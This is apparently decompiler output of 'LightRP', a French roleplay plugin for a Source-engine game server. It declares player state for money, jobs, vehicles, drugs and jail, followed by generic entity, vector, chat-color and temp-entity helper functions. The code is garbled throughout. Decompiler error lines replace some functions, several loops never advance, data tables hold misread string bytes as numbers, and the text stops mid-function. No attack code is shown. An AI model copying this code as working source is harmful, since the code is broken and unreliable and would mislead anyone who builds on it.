new PlVers:__version = 5;
new Float:NULL_VECTOR[3];
new String:NULL_STRING[1];
new Extension:__ext_core = 68;
new MaxClients;
new Extension:__ext_sdktools = 1596;
new Extension:__ext_sdkhooks = 1640;
new Extension:__ext_cstrike = 1684;
new localIPRanges[4] =
{
	1315528557, 6647137, 1130979181, 1936941420
};
new String:chatColorNames[12][0];
new String:chatColorTags[12][4] =
{
	"normal",
	"orange",
	"red",
	"redblue",
	"blue",
	"bluered",
	"team",
	"lightgreen",
	"gray",
	"green",
	"olivegreen",
	"black"
};
new chatColorInfo[12][4] =
{
	{
		1, -1, 1, -3
	},
	{
		1, 0, 1, -3
	},
	{
		3, 9, 1, 2
	},
	{
		3, 4, 1, 2
	},
	{
		3, 9, 1, 3
	},
	{
		3, 2, 1, 3
	},
	{
		3, 9, 1, -2
	},
	{
		3, 9, 1, 0
	},
	{
		3, 9, 1, -1
	},
	{
		4, 0, 1, -3
	},
	{
		5, 9, 1, -3
	},
	{
		6, 9, 1, -3
	}
};
new bool:checkTeamPlay;
new Handle:mp_teamplay;
new bool:isSayText2_supported = 1;
new chatSubject = -2;
new printToChat_excludeclient = 1801545811;
new String:base64_sTable[17] = "bz2";
new String:base64_url_chars[1] = "bz2";
new String:base64_mime_chars[1] = "bz2";
new base64_decodeTable[256] =
{
	3308130, 1886221434, 0, 12079, 47, 46, 11822, 623866661, 115, 42, 46, 46, 11822, 623866661, 115, 25202, 25207, 11822, 46, 623866661, 115, 623866661, 115, 0, 1953722216, 1953656688, 0, 1634038867, 1869567085, 29548, 1634038899, 1869575277, 1697543020, 29816, 2944, 2956, 1, 1, 1953724755, 540175717, 1702131781, 1869181806, 110, 1953724787, 775056741, 7632997, 2988, 3008, 1, 1, 1852731203, 7627621, 1852731235, 779379557, 7632997, 3036, 3044, 1, 1, 1668443507, 28271, 1668443507, 1697541743, 29816, 3072, 3080, 1, 1, 1751607628, 5263988, 1701343315, 120, 1701605202, 2036427888, 1685015840, 0, 775040561, 53, 1886680168, 1999580986, 1932425079, 2019911792, 796026414, 0, 3108, 3124, 3116, 3140, 3148, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};
new base64_cFillChar = 3308130;
new String:_smlib_empty_twodimstring_array[1][4];
new Extension:__ext_SteamTools = 2944;
new Extension:__ext_system = 2988;
new Extension:__ext_Connect = 3036;
new Extension:__ext_smrcon = 3072;
public Plugin:myinfo =
{
	name = "LightRP",
	description = "Roleplay Mod",
	author = "Sphex",
	version = "1.2.5",
	url = "http://www.sphex.fr/"
};
new String:VersionLRP[16];
new bool:lockupdate;
new expireTime = 1;
new bool:PluginStarted;
new idSave = 1;
new PLUGIN_ID;
new Functionalitie[20];
new Handle:hStartMoney;
new StartMoney;
new Handle:hPanelLink;
new String:PanelLink[64];
new Handle:hDebugMode;
new bool:DebugMode;
new Handle:hShowNoteLink;
new String:ShowNoteLink[64];
new Handle:hAllowCars;
new bool:AllowCars;
new Handle:hAllowTazer;
new bool:AllowTazer;
new BallColor[17];
new ItemColorBall[66];
new ColorBallCount[66];
new g_bIsConnected[65];
new bool:CL_Ragdoll[66];
new ClientCamera[66];
new Handle:hGameCfg;
new Handle:hLeaveVehicle;
new offsPunchAngle;
new String:abc[41];
new bool:IsDisconnect[66];
new bool:Loaded[66];
new bool:InQuery;
new RebootTimer = 20;
new Uptime;
new activeOffset = -1;
new clip1Offset = -1;
new clip2Offset = -1;
new secAmmoTypeOffset = -1;
new priAmmoTypeOffset = -1;
new bool:UnlimitedAmmo[66];
new bool:OneShotMode[66];
new gObj[66];
new Float:gDistance[66];
new bool:CarView[66];
new Float:CurrentEyeAngle[66][3];
new bool:CarSiren[2049];
new bool:CarHorn[66];
new Cars_Driver_Prop[2049];
new Handle:h_siren_a;
new Handle:h_siren_b;
new Handle:h_siren_c;
new CarImpala[66];
new CarPoliceImpala[66];
new CarMustang[66];
new CarTacoma[66];
new CarMustangGT[66];
new CarDirtBike[66];
new CarImpalaHP[66];
new CarPoliceImpalaHP[66];
new CarMustangHP[66];
new CarTacomaHP[66];
new CarMustangGTHP[66];
new CarDirtBikeHP[66];
new bool:HaveJetPack[66];
new JetPackGaz[66];
new Connected[66];
new bool:Answered[66];
new Float:gNextPickup[66];
new TimeOut[66];
new bool:PhoneStop[66];
new TazerTimer[66];
new NBKill[66];
new PlayTime[66];
new TempPTTime[66];
new PTMinutes[66];
new PTHours[66];
new PlayTimeSinceLogin[66];
new money[66];
new bank[66];
new JobID[66];
new String:JobName[66][16];
new RankID[66];
new String:RankName[66][16];
new player_respawn_wait[66];
new String:sLastKiller[66][16];
new bool:ActualThirdPerson[66];
new JailTime[66];
new JailHours[66];
new JailMinutes[66];
new TempJailTime[66];
new TempJailHours[66];
new bool:FirstJail[66];
new Salary[66];
new bool:EspionMode[66];
new String:Zone[66][64];
new ragdoll[66];
new CutRestant[66];
new DefRestant[66];
new Handle:AfkTimer[66];
new bool:HasDiplome[66];
new HasPermisLeger[66];
new HasPermisLourd[66];
new bool:AfkMode[66];
new Float:Afk_VecPos[66][3];
new Skin[66];
new Group[66];
new Channel[66];
new String:Wanted[16] = "NO";
new RPPoints[66];
new bool:CanOneShot[66];
new bool:BeInvincible[66];
new FlameLeft[66];
new bool:HasHEFreeze[66];
new bool:HasHEFire[66];
new bool:ShowWeapons[66];
new bool:ShowDrugs[66];
new bool:ShowComposant[66];
new bool:ShowOther[66];
new bool:CanGetKit[66];
new bool:IsInJail[66];
new bool:OnMafia[66];
new bool:OnDisco[66];
new bool:OnAmmuNation[66];
new bool:OnHopital[66];
new bool:OnDealer[66];
new bool:OnAirControl[66];
new bool:OnAtlantic[66];
new bool:OnComico[66];
new bool:OnDistrib1[66];
new bool:OnDistrib2[66];
new bool:OnDistrib3[66];
new bool:OnDistrib4[66];
new bool:OnBanque[66];
new bool:OnTriades[66];
new bool:OnDetectives[66];
new bool:OnTribunal[66];
new bool:OnEpicerie[66];
new bool:OnArnaqueur[66];
new bool:OnCarShop[66];
new bool:OnPizzeria[66];
new bool:OnBar[66];
new bool:OnCoach[66];
new bool:OnIkea[66];
new bool:OnMoniteur[66];
new Capital[128];
new lastHealth[66] =
{
	100, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};
new bool:CanUseTazer[66];
new bool:LaserOn[66];
new CanVol[66];
new bool:IsCrochette[66];
new CanPick[66];
new Handle:hStopPiratage[66];
new ItemVodka[66];
new ItemRedbull[66];
new ItemMojito[66];
new String:SongLaunch[66][64];
new bool:ArnaqueMode[66];
new ArnaqueJobID[66];
new cibleID[66];
new bool:HasKillCible[66];
new BoostDispo[66];
new bool:BoostDeagle[66];
new bool:BoostVitesse[66];
new bool:BoostLife[66];
new bool:BoostCut[66];
new bool:BoostInv[66];
new Hours;
new Minutes;
new Days = 1;
new Months;
new Years = 1;
new String:MonthName[9] = "Janvier";
new m4a1_index;
new fiveseven_index;
new usp_index;
new m3_index;
new scout_index;
new CarPolice1;
new CarPolice2;
new Handle:spawnkvT;
new Handle:spawnkvCT;
new Handle:Cellkv;
new Handle:SongsKV;
new g_SpawnQtyT;
new g_SpawnQtyCT;
new g_CellQty;
new Float:g_SpawnLocT[256][3];
new Float:g_SpawnLocCT[256][3];
new Float:g_CellLoc[256][3];
new String:CitoyenModels[50][128];
new String:CTModels[5][128];
new Handle:skinskvT;
new Handle:skinskvCT;
new g_SkinQtyT;
new String:DJSong[64][32];
new SongsCount;
new Handle:g_JobMenu;
new Handle:g_VirerMenu;
new Handle:GPS;
new g_BeamSpriteFollow;
new g_BeamSprite;
new g_HaloSprite;
new g_glow;
new g_LightingSprite;
new GlowSprite;
new g_beamsprite;
new gMarkerSprite;
new bool:isInvi[66];
new gCollisionOffset;
new g_weaponHasOwner;
new ItemLanceFlamme[66];
new ItemHEFreeze[66];
new ItemHEFire[66];
new CarFordGT[66];
new CarFordGTHP[66];
new ItemPizza[66];
new KitCrochettage[66];
new WeaponGlock[66];
new WeaponUSP[66];
new Weaponp228[66];
new Weapondeagle[66];
new Weaponelite[66];
new Weaponfiveseven[66];
new Weaponm3[66];
new Weaponxm1014[66];
new Weapongalil[66];
new Weaponak47[66];
new Weaponscout[66];
new Weaponsg552[66];
new Weaponawp[66];
new Weapong3sg1[66];
new Weaponfamas[66];
new Weaponm4a1[66];
new Weaponaug[66];
new Weaponsg550[66];
new Weaponmac10[66];
new Weapontmp[66];
new Weaponmp5navy[66];
new Weaponump45[66];
new Weaponp90[66];
new Weaponm249[66];
new StuffCartouche[66];
new StuffGrenade[66];
new StuffFlash[66];
new StuffFumi[66];
new StuffKevelar[66];
new DrogueLSD[66];
new DrogueHero[66];
new DrogueExtasy[66];
new DrogueCoke[66];
new DrogueWeed[66];
new ItemJetPack[66];
new ItemGazAC[66];
new KitSoins[66];
new bool:ChirurgiePoumon[66];
new bool:ChirurgieSouplesse[66];
new bool:ChirurgieAda[66];
new ItemTicket10[66];
new ItemTicket50[66];
new ItemTicket100[66];
new ItemTicket500[66];
new PlayerHasCB[66];
new PlayerHasRIB[66];
new DiplomeTir[66];
new PermisLeger[66];
new PermisLourd[66];
new ItemLessive[66];
new ItemCafe[66];
new ItemNuteChoco[66];
new ItemGateauChoco[66];
new ItemSucetteMenthe[66];
new ItemDroom[66];
new bool:CanPlayGlace[66];
new Location[6];
new String:sLocation[6][16];
new ItemGroup[66];
new dbTry;
new Handle:tDB;
new gTV[66];
new gTVMissile[66];
new EntKitCrochettage[66];
new g_CarLights[2049][200];
new buttons2;
new ViewEnt[2049];
new seat[2049];
new identifier;
new RID[255];
new CommanditeurID[66];
new PriceContrat[66];
new TempCibleID[66];
new String:SellItemChirurgie[66][64];
new String:SellItemBanque[66][64];
new String:SellItemPermis[66][64];
new PlayerGPS[66];
new String:CTag[6][0];
new String:CTagCode[6][4] =
{
	"",
	"",
	"",
	"",
	"",
	""
};
new bool:CTagReqSayText2[6] =
{
	0, 0, 1, 1, 1, 0
};
new bool:CEventIsHooked;
new bool:CSkipList[66];
new bool:CProfile_Colors[6] =
{
	1, 1, 0, 0, 0, 0
};
new CProfile_TeamIndex[6] =
{
	-1, ...
};
new bool:CProfile_SayText2;
public __ext_core_SetNTVOptional()
{
	MarkNativeAsOptional("GetFeatureStatus");
	MarkNativeAsOptional("RequireFeature");
	MarkNativeAsOptional("AddCommandListener");
	MarkNativeAsOptional("RemoveCommandListener");
	VerifyCoreVersion();
	return 0;
}

Float:operator/(Float:,_:)(Float:oper1, oper2)
{
	return oper1 / float(oper2);
}

Float:operator+(Float:,_:)(Float:oper1, oper2)
{
	return oper1 + float(oper2);
}

Float:operator-(Float:,_:)(Float:oper1, oper2)
{
	return oper1 - float(oper2);
}

bool:operator==(Float:,Float:)(Float:oper1, Float:oper2)
{
	return FloatCompare(oper1, oper2) == 0;
}

bool:operator>(Float:,Float:)(Float:oper1, Float:oper2)
{
	return FloatCompare(oper1, oper2) > 0;
}

bool:operator>(Float:,_:)(Float:oper1, oper2)
{
	return FloatCompare(oper1, float(oper2)) > 0;
}

bool:operator<(Float:,Float:)(Float:oper1, Float:oper2)
{
	return FloatCompare(oper1, oper2) < 0;
}

bool:operator<(Float:,_:)(Float:oper1, oper2)
{
	return FloatCompare(oper1, float(oper2)) < 0;
}

bool:operator<=(Float:,Float:)(Float:oper1, Float:oper2)
{
	return FloatCompare(oper1, oper2) <= 0;
}

bool:operator<=(Float:,_:)(Float:oper1, oper2)
{
	return FloatCompare(oper1, float(oper2)) <= 0;
}

bool:operator<=(_:,Float:)(oper1, Float:oper2)
{
	return FloatCompare(float(oper1), oper2) <= 0;
}

Float:DegToRad(Float:angle)
{
	return 3.141593 * angle / 180;
}

AddVectors(Float:vec1[3], Float:vec2[3], Float:result[3])
{
	result[0] = vec1[0] + vec2[0];
	result[1] = vec1[1] + vec2[1];
	result[2] = vec1[2] + vec2[2];
	return 0;
}

SubtractVectors(Float:vec1[3], Float:vec2[3], Float:result[3])
{
	result[0] = vec1[0] - vec2[0];
	result[1] = vec1[1] - vec2[1];
	result[2] = vec1[2] - vec2[2];
	return 0;
}

ScaleVector(Float:vec[3], Float:scale)
{
	new var1 = vec;
	var1[0] = var1[0] * scale;
	vec[1] *= scale;
	vec[2] *= scale;
	return 0;
}

bool:StrEqual(String:str1[], String:str2[], bool:caseSensitive)
{
	return strcmp(str1, str2, caseSensitive) == 0;
}

FindCharInString(String:str[], c, bool:reverse)
{
	new i = 0;
	new len = strlen(str);
	if (!reverse)
	{
		i = 0;
		while (i < len)
		{
			if (c == str[i])
			{
				return i;
			}
			i++;
		}
	}
	else
	{
		i = len + -1;
		while (0 <= i)
		{
			if (c == str[i])
			{
				return i;
			}
			i--;
		}
	}
	return -1;
}

StrCat(String:buffer[], maxlength, String:source[])
{
	new len = strlen(buffer);
	if (len >= maxlength)
	{
		return 0;
	}
	return Format(buffer[len], maxlength - len, "%s", source);
}

ExplodeString(String:text[], String:split[], String:buffers[][], maxStrings, maxStringLength, bool:copyRemainder)
{
	new reloc_idx = 0;
	new idx = 0;
	new total = 0;
	new var1;
	if (maxStrings < 1)
	{
		return 0;
	}
	new var2 = SplitString(text[reloc_idx], split, buffers[total], maxStringLength);
	idx = var2;
	while (var2 != -1)
	{
		reloc_idx = idx + reloc_idx;
		total++;
		if (maxStrings == total)
		{
			if (copyRemainder)
			{
				strcopy(buffers[total + -1], maxStringLength, text[reloc_idx - idx]);
			}
			return total;
		}
	}
	total++;
	strcopy(buffers[total], maxStringLength, text[reloc_idx]);
	return total;
}


/* ERROR! Unrecognized opcode: genarray_z */
 function "StartMessageAll" (number 20)
Handle:StartMessageOne(String:msgname[], client, flags)
{
	decl players[1];
	players[0] = client;
	return StartMessage(msgname, players, 1, flags);
}

PrintToChatAll(String:format[])
{
	decl String:buffer[192];
	new i = 1;
	while (i <= MaxClients)
	{
		if (IsClientInGame(i))
		{
			SetGlobalTransTarget(i);
			VFormat(buffer, 192, format, 2);
			PrintToChat(i, "%s", buffer);
			i++;
		}
		i++;
	}
	return 0;
}

ShowMOTDPanel(client, String:title[], String:msg[], type)
{
	decl String:num[4];
	new Handle:Kv = CreateKeyValues("data", "", "");
	IntToString(type, num, 3);
	KvSetString(Kv, "title", title);
	KvSetString(Kv, "type", num);
	KvSetString(Kv, "msg", msg);
	ShowVGUIPanel(client, "info", Kv, true);
	CloseHandle(Kv);
	return 0;
}

GetEntSendPropOffs(ent, String:prop[], bool:actual)
{
	decl String:cls[64];
	if (!GetEntityNetClass(ent, cls, 64))
	{
		return -1;
	}
	if (actual)
	{
		return FindSendPropInfo(cls, prop, 0, 0, 0);
	}
	return FindSendPropOffs(cls, prop);
}

MoveType:GetEntityMoveType(entity)
{
	static bool:gotconfig;
	static String:datamap[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_MoveType", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_MoveType");
		}
		gotconfig = 1;
	}
	return GetEntProp(entity, PropType:1, "", 4, 0);
}

SetEntityMoveType(entity, MoveType:mt)
{
	static bool:gotconfig;
	static String:datamap[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_MoveType", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_MoveType");
		}
		gotconfig = 1;
	}
	SetEntProp(entity, PropType:1, "", mt, 4, 0);
	return 0;
}

SetEntityRenderMode(entity, RenderMode:mode)
{
	static bool:gotconfig;
	static String:prop[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_nRenderMode", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_nRenderMode");
		}
		gotconfig = 1;
	}
	SetEntProp(entity, PropType:0, "", mode, 1, 0);
	return 0;
}

SetEntityRenderColor(entity, r, g, b, a)
{
	static bool:gotconfig;
	static String:prop[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_clrRender", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_clrRender");
		}
		gotconfig = 1;
	}
	new offset = GetEntSendPropOffs(entity, "", false);
	if (0 >= offset)
	{
		ThrowError("SetEntityRenderColor not supported by this mod");
	}
	SetEntData(entity, offset, r, 1, true);
	SetEntData(entity, offset + 1, g, 1, true);
	SetEntData(entity, offset + 2, b, 1, true);
	SetEntData(entity, offset + 3, a, 1, true);
	return 0;
}

SetEntityGravity(entity, Float:amount)
{
	static bool:gotconfig;
	static String:datamap[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_flGravity", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_flGravity");
		}
		gotconfig = 1;
	}
	SetEntPropFloat(entity, PropType:1, "", amount, 0);
	return 0;
}

SetEntityHealth(entity, amount)
{
	static bool:gotconfig;
	static String:prop[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_iHealth", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_iHealth");
		}
		gotconfig = 1;
	}
	decl String:cls[64];
	new PropFieldType:type = 0;
	new offset = 0;
	if (!GetEntityNetClass(entity, cls, 64))
	{
		ThrowError("SetEntityHealth not supported by this mod: Could not get serverclass name");
		return 0;
	}
	offset = FindSendPropInfo(cls, "", type, 0, 0);
	if (0 >= offset)
	{
		ThrowError("SetEntityHealth not supported by this mod");
		return 0;
	}
	if (type == PropFieldType:2)
	{
		SetEntDataFloat(entity, offset, float(amount), false);
	}
	else
	{
		SetEntProp(entity, PropType:0, "", amount, 4, 0);
	}
	return 0;
}

GetClientButtons(client)
{
	static bool:gotconfig;
	static String:datamap[8];
	if (!gotconfig)
	{
		new Handle:gc = LoadGameConfigFile("core.games");
		new bool:exists = GameConfGetKeyValue(gc, "m_nButtons", "", 32);
		CloseHandle(gc);
		if (!exists)
		{
			strcopy("", 32, "m_nButtons");
		}
		gotconfig = 1;
	}
	return GetEntProp(client, PropType:1, "", 4, 0);
}

EmitSoundToClient(client, String:sample[], entity, channel, level, flags, Float:volume, pitch, speakerentity, Float:origin[3], Float:dir[3], bool:updatePos, Float:soundtime)
{
	decl clients[1];
	clients[0] = client;
	new var1;
	if (entity == -2)
	{
		var1 = client;
	}
	else
	{
		var1 = entity;
	}
	entity = var1;
	EmitSound(clients, 1, sample, entity, channel, level, flags, volume, pitch, speakerentity, origin, dir, updatePos, soundtime);
	return 0;
}


/* ERROR! Unrecognized opcode: genarray_z */
 function "EmitSoundToAll" (number 33)
AddFileToDownloadsTable(String:filename[])
{
	static table = -1;
	if (table == -1)
	{
		table = FindStringTable("downloadables");
	}
	new bool:save = LockStringTables(false);
	AddToStringTable(table, filename, "", -1);
	LockStringTables(save);
	return 0;
}

TE_WriteEncodedEnt(String:prop[], value)
{
	new encvalue = value & 4095 | 4096;
	return TE_WriteNum(prop, encvalue);
}


/* ERROR! Unrecognized opcode: genarray_z */
 function "TE_SendToAll" (number 36)
TE_SendToClient(client, Float:delay)
{
	decl players[1];
	players[0] = client;
	return TE_Send(players, 1, delay);
}

TE_SetupGlowSprite(Float:pos[3], Model, Float:Life, Float:Size, Brightness)
{
	TE_Start("GlowSprite");
	TE_WriteVector("m_vecOrigin", pos);
	TE_WriteNum("m_nModelIndex", Model);
	TE_WriteFloat("m_fScale", Size);
	TE_WriteFloat("m_fLife", Life);
	TE_WriteNum("m_nBrightness", Brightness);
	return 0;
}

TE_SetupBeamRingPoint(Float:center[3], Float:Start_Radius, Float:End_Radius, ModelIndex, HaloIndex, StartFrame, FrameRate, Float:Life, Float:Width, Float:Amplitude, Color[4], Speed, Flags)
{
	TE_Start("BeamRingPoint");
	TE_WriteVector("m_vecCenter", center);
	TE_WriteFloat("m_flStartRadius", Start_Radius);
	TE_WriteFloat("m_flEndRadius", End_Radius);
	TE_WriteNum("m_nModelIndex", ModelIndex);
	TE_WriteNum("m_nHaloIndex", HaloIndex);
	TE_WriteNum("m_nStartFrame", StartFrame);
	TE_WriteNum("m_nFrameRate", FrameRate);
	TE_WriteFloat("m_fLife", Life);
	TE_WriteFloat("m_fWidth", Width);
	TE_WriteFloat("m_fEndWidth", Width);
	TE_WriteFloat("m_fAmplitude", Amplitude);
	TE_WriteNum("r", Color[0]);
	TE_WriteNum("g", Color[1]);
	TE_WriteNum("b", Color[2]);
	TE_WriteNum("a", Color[3]);
	TE_WriteNum("m_nSpeed", Speed);
	TE_WriteNum("m_nFlags", Flags);
	TE_WriteNum("m_nFadeLength", 0);
	return 0;
}

TE_SetupBeamPoints(Float:start[3], Float:end[3], ModelIndex, HaloIndex, StartFrame, FrameRate, Float:Life, Float:Width, Float:EndWidth, FadeLength, Float:Amplitude, Color[4], Speed)
{
	TE_Start("BeamPoints");
	TE_WriteVector("m_vecStartPoint", start);
	TE_WriteVector("m_vecEndPoint", end);
	TE_WriteNum("m_nModelIndex", ModelIndex);
	TE_WriteNum("m_nHaloIndex", HaloIndex);
	TE_WriteNum("m_nStartFrame", StartFrame);
	TE_WriteNum("m_nFrameRate", FrameRate);
	TE_WriteFloat("m_fLife", Life);
	TE_WriteFloat("m_fWidth", Width);
	TE_WriteFloat("m_fEndWidth", EndWidth);
	TE_WriteFloat("m_fAmplitude", Amplitude);
	TE_WriteNum("r", Color[0]);
	TE_WriteNum("g", Color[1]);
	TE_WriteNum("b", Color[2]);
	TE_WriteNum("a", Color[3]);
	TE_WriteNum("m_nSpeed", Speed);
	TE_WriteNum("m_nFadeLength", FadeLength);
	return 0;
}

TE_SetupBeamFollow(EntIndex, ModelIndex, HaloIndex, Float:Life, Float:Width, Float:EndWidth, FadeLength, Color[4])
{
	TE_Start("BeamFollow");
	TE_WriteEncodedEnt("m_iEntIndex", EntIndex);
	TE_WriteNum("m_nModelIndex", ModelIndex);
	TE_WriteNum("m_nHaloIndex", HaloIndex);
	TE_WriteNum("m_nStartFrame", 0);
	TE_WriteNum("m_nFrameRate", 0);
	TE_WriteFloat("m_fLife", Life);
	TE_WriteFloat("m_fWidth", Width);
	TE_WriteFloat("m_fEndWidth", EndWidth);
	TE_WriteNum("m_nFadeLength", FadeLength);
	TE_WriteNum("r", Color[0]);
	TE_WriteNum("g", Color[1]);
	TE_WriteNum("b", Color[2]);
	TE_WriteNum("a", Color[3]);
	return 0;
}

Float:Math_UnitsToMeters(Float:units)
{
	return 0.01905 * units;
}

Array_FindString(String:array[][], size, String:str[], bool:caseSensitive, start)
{
	if (0 > start)
	{
		start = 0;
	}
	new i = start;
	while (i < size)
	{
		if (StrEqual(array[i], str, caseSensitive))
		{
			return i;
		}
		i++;
	}
	return -1;
}

Entity_IsValid(entity)
{
	return IsValidEntity(entity);
}

Entity_FindByName(String:name[], String:class[])
{
	if (class[0])
	{
		new entity = -1;
		new var1 = FindEntityByClassname(entity, class);
		entity = var1;
		while (var1 != -1)
		{
			if (Entity_NameMatches(entity, name))
			{
				return entity;
			}
		}
	}
	else
	{
		new realMaxEntities = GetMaxEntities() * 2;
		new entity = 0;
		while (entity < realMaxEntities)
		{
			if (IsValidEntity(entity))
			{
				if (Entity_NameMatches(entity, name))
				{
					return entity;
				}
			}
			entity++;
		}
	}
	return -1;
}

Entity_FindByHammerId(hammerId, String:class[])
{
	if (class[0])
	{
		new entity = -1;
		new var1 = FindEntityByClassname(entity, class);
		entity = var1;
		while (var1 != -1)
		{
			if (hammerId == Entity_GetHammerId(entity))
			{
				return entity;
			}
		}
	}
	else
	{
		new realMaxEntities = GetMaxEntities() * 2;
		new entity = 0;
		while (entity < realMaxEntities)
		{
			if (IsValidEntity(entity))
			{
				if (hammerId == Entity_GetHammerId(entity))
				{
					return entity;
				}
			}
			entity++;
		}
	}
	return -1;
}

bool:Entity_ClassNameMatches(entity, String:className[], partialMatch)
{
	decl String:entity_className[64];
	Entity_GetClassName(entity, entity_className, 64);
	if (partialMatch)
	{
		return StrContains(entity_className, className, true) != -1;
	}
	return StrEqual(entity_className, className, true);
}

bool:Entity_NameMatches(entity, String:name[])
{
	decl String:entity_name[128];
	Entity_GetName(entity, entity_name, 128);
	return StrEqual(name, entity_name, true);
}

Entity_GetName(entity, String:buffer[], size)
{
	GetEntPropString(entity, PropType:1, localIPRanges, buffer, size, 0);
	return 0;
}

Entity_GetClassName(entity, String:buffer[], size)
{
	GetEntPropString(entity, PropType:1, "m_iClassname", buffer, size, 0);
	if (buffer[0])
	{
		return 1;
	}
	return 0;
}

Entity_GetHammerId(entity)
{
	return GetEntProp(entity, PropType:1, "m_iHammerID", 4, 0);
}

Entity_GetAbsOrigin(entity, Float:vec[3])
{
	GetEntPropVector(entity, PropType:1, "m_vecOrigin", vec, 0);
	return 0;
}

bool:Entity_IsLocked(entity)
{
	return GetEntProp(entity, PropType:1, "m_bLocked", 1, 0);
}

Float:Entity_GetDistanceOrigin(entity, Float:vec[3])
{
	decl Float:entityVec[3];
	Entity_GetAbsOrigin(entity, entityVec);
	return GetVectorDistance(entityVec, vec, false);
}

Float:Entity_GetDistance(entity, target)
{
	decl Float:targetVec[3];
	Entity_GetAbsOrigin(target, targetVec);
	return Entity_GetDistanceOrigin(entity, targetVec);
}

bool:Entity_IsPlayer(entity)
{
	new var1;
	if (entity < 1)
	{
		return false;
	}
	return true;
}

bool:Entity_Kill(kenny)
{
	if (Entity_IsPlayer(kenny))
	{
		ForcePlayerSuicide(kenny);
		return true;
	}
	return AcceptEntityInput(kenny, "kill", -1, -1, 0);
}

Entity_KillAllByClassName(String:className[])
{
	new x = 0;
	new entity = -1;
	new var1 = FindEntityByClassname(entity, className);
	entity = var1;
	while (var1 != -1)
	{
		AcceptEntityInput(entity, "kill", -1, -1, 0);
		x++;
	}
	return x;
}

Entity_GetOwner(entity)
{
	return GetEntPropEnt(entity, PropType:1, "m_hOwnerEntity", 0);
}

Team_GetAnyClient(index)
{
	static client_cache[32] =
	{
		-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	};
	new client = 0;
	if (0 < index)
	{
		client = client_cache[index][0][0];
		new var1;
		if (client > 0)
		{
			new var2;
			if (IsClientInGame(client))
			{
				return client;
			}
		}
		client = -1;
	}
	client = 1;
	while (client <= MaxClients)
	{
		if (IsClientInGame(client))
		{
			if (index != GetClientTeam(client))
			{
			}
			else
			{
				client_cache[index] = client;
				return client;
			}
		}
		client++;
	}
	return -1;
}

Color_ChatInitialize()
{
	static initialized;
	if (initialized)
	{
		return 0;
	}
	initialized = 1;
	decl String:gameFolderName[32];
	GetGameFolderName(gameFolderName, 32);

/* ERROR! unknown load */
 function "Color_ChatInitialize" (number 61)
Color_GetChatColorInfo(&index, &subject)
{
	Color_ChatInitialize();
	if (index == -1)
	{
		index = 0;
		while (!chatColorInfo[index][0][0][2])
		{
			new alternative = chatColorInfo[index][0][0][1];
			if (alternative == -1)
			{
				index = 0;
				if (index == -1)
				{
					index = 0;
				}
				new newSubject = -2;
				new ChatColorSubjectType:type = chatColorInfo[index][0][0][3];
				switch (type)
				{
					case -3:
					{
					}
					case -2:
					{
						newSubject = chatSubject;
					}
					case -1:
					{
						newSubject = -1;
					}
					case 0:
					{
						newSubject = 0;
					}
					default:
					{
						new var1;
						if (!checkTeamPlay)
						{
							new var2;
							if (subject > 0)
							{
								if (type == GetClientTeam(subject))
								{
									newSubject = subject;
								}
							}
							if (subject == -2)
							{
								new client = Team_GetAnyClient(type);
								if (client != -1)
								{
									newSubject = client;
								}
							}
						}
					}
				}
				new var5;
				if (type > ChatColorSubjectType:-3)
				{
					index = chatColorInfo[index][0][0][1];
					newSubject = Color_GetChatColorInfo(index, subject);
				}
				if (subject == -2)
				{
					subject = newSubject;
				}
				return newSubject;
			}
			index = alternative;
		}
		if (index == -1)
		{
			index = 0;
		}
		new newSubject = -2;
		new ChatColorSubjectType:type = chatColorInfo[index][0][0][3];
		switch (type)
		{
			case -3:
			{
			}
			case -2:
			{
				newSubject = chatSubject;
			}
			case -1:
			{
				newSubject = -1;
			}
			case 0:
			{
				newSubject = 0;
			}
			default:
			{
				new var1;
				if (!checkTeamPlay)
				{
					new var2;
